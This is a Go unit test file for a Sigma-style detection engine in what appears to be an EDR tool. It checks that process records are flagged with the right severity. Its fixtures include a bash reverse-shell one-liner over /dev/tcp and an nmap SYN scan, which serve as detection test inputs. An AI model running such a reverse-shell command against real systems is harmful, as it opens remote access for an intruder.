package detect

import (
	"context"
	"testing"
	"time"

	"github.com/cladkins/siembox-edr/internal/models"
	"github.com/cladkins/siembox-edr/internal/telemetry"
)

// fakeSource emits a fixed set of records then blocks until ctx is cancelled.
type fakeSource struct{ records []telemetry.Record }

func (f fakeSource) Start(ctx context.Context, out chan<- telemetry.Record) error {
	for _, r := range f.records {
		select {
		case out <- r:
		case <-ctx.Done():
			return ctx.Err()
		}
	}
	<-ctx.Done()
	return ctx.Err()
}

func proc(cols map[string]string) telemetry.Record {
	return telemetry.Record{Query: "processes", Action: "added", Columns: cols, Timestamp: time.Now()}
}

func TestDefaultRulesParse(t *testing.T) {
	rules, err := DefaultRules()
	if err != nil {
		t.Fatalf("DefaultRules: %v", err)
	}
	if len(rules) != 3 {
		t.Fatalf("got %d default rules, want 3", len(rules))
	}
	// Compiling them should not error.
	e := NewSigmaEngine(fakeSource{}, rules, nil)
	if err := e.LoadRules(nil); err != nil {
		t.Fatalf("LoadRules: %v", err)
	}
}

func TestEngineDetections(t *testing.T) {
	base, err := DefaultRules()
	if err != nil {
		t.Fatal(err)
	}
	records := []telemetry.Record{
		proc(map[string]string{"name": "evil", "path": "/tmp/evil", "cmdline": "/tmp/evil"}),          // temp-exec (high)
		proc(map[string]string{"name": "bash", "path": "/bin/bash", "cmdline": "bash -i >& /dev/tcp/10.0.0.1/4444 0>&1"}), // revshell (critical) + dev/tcp
		proc(map[string]string{"name": "nmap", "path": "/usr/bin/nmap", "cmdline": "nmap -sS 10.0.0.0/24"}),  // offensive (medium)
		proc(map[string]string{"name": "ls", "path": "/usr/bin/ls", "cmdline": "ls -la"}),               // benign
	}

	e := NewSigmaEngine(fakeSource{records: records}, base, nil)
	if err := e.LoadRules(nil); err != nil {
		t.Fatal(err)
	}

	ctx, cancel := context.WithCancel(context.Background())
	defer cancel()
	out := make(chan models.Event, 32)
	go e.Run(ctx, out)

	got := map[string]string{} // ruleID -> severity
	deadline := time.After(2 * time.Second)
loop:
	for {
		select {
		case ev := <-out:
			got[ev.RuleID] = ev.Severity
			if ev.Type != models.EventTypeDetection {
				t.Errorf("event type = %q", ev.Type)
			}
			if ev.Source != "osquery:processes" {
				t.Errorf("source = %q", ev.Source)
			}
		case <-deadline:
			break loop
		}
		if len(got) >= 3 {
			// Give a brief moment to ensure no benign match sneaks in.
			time.Sleep(100 * time.Millisecond)
			break
		}
	}

	if got["siembox-proc-temp-exec"] != models.SeverityHigh {
		t.Errorf("temp-exec severity = %q, want high", got["siembox-proc-temp-exec"])
	}
	if got["siembox-revshell-cmdline"] != models.SeverityCritical {
		t.Errorf("revshell severity = %q, want critical", got["siembox-revshell-cmdline"])
	}
	if got["siembox-offensive-tool"] != models.SeverityMedium {
		t.Errorf("offensive severity = %q, want medium", got["siembox-offensive-tool"])
	}
}

func TestInvalidRuleSkipped(t *testing.T) {
	e := NewSigmaEngine(fakeSource{}, nil, nil)
	// One valid, one garbage. LoadRules returns the first error but still loads
	// the valid rule.
	valid := `title: T
id: t1
level: low
detection:
  selection:
    query: processes
  condition: selection`
	// Unterminated YAML flow sequence -> parse error.
	if err := e.LoadRules([]string{valid, "title: ["}); err == nil {
		t.Error("expected error from invalid rule")
	}
	e.mu.RLock()
	n := len(e.rules)
	e.mu.RUnlock()
	if n != 1 {
		t.Errorf("compiled %d rules, want 1 valid", n)
	}
}
